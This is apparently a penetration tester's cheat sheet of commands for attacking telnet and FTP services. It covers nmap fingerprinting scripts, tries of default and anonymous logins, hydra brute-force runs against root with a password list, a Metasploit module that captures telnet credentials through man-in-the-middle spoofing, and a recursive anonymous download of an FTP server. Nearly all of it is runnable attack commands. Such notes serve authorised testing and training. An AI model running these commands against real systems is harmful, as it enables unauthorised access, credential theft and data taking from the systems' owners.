# Discovers remote FQDN (hostname and domain) if port is open
nmap -p 23 --script=telnet-ntlm-info.nse <host>

# Testing anonymous login by connecting and, if presented with login prompt, try anonymous:anonymous. Also useful to grab the banner
telnet <host> 21

# Try other safe nmap scripts. SHould also give you service information, which may help with fingerprinting for exploitation
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <host>

# If you positivel;y identify the remote service, you can try authenticating with default credentials. Similarly, if you have previously compromised credentials you can try them here.
# Try authenticating with credentials such as root:<empty> etc. admin:admin, admin:<blank.
# If you have positiely identified the remote aservice, use searchsploit to try for exploits.

# BruteForce Attack
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt $ip telnet
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet

# Telnet Spoofing
MITM: Telnet Spoofing
An attack may use telnet spoofing as a Man-in-the-middle attack in order to capture the telnet login credential.

use auxiliary/server/capture/telnet
set srvhost 192.168.0.102
set banner Welcome to Hacking Articles
exploit

# Telnet commands

dir
cd <folder>
strings backup.mdb > possiblepasswords.txt

# Run from your kali instance to download all contents to your machine for review
wget --recursive --ftp-user=anonymous --ftp-password=any --no-passive-ftp ftp://10.10.10.98
